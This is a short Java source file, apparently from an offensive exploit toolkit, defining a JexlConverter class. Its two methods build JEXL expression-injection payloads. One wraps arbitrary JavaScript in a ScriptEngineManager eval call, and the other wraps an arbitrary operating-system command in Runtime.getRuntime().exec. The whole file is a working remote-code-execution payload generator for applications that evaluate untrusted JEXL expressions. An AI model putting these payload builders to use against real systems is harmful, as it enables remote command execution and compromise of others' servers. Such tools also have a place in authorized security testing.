package com.h2tg.ysogate.bullet.defineClass;

public class JexlConverter
{
    public static String jexl2js(String js)
    {
        String code = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+js+"\")";
        return code;
    }

    public static String jexl2cmd(String cmd)
    {
        String code = "''.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\""+cmd+"\")";
        return code;
    }
}
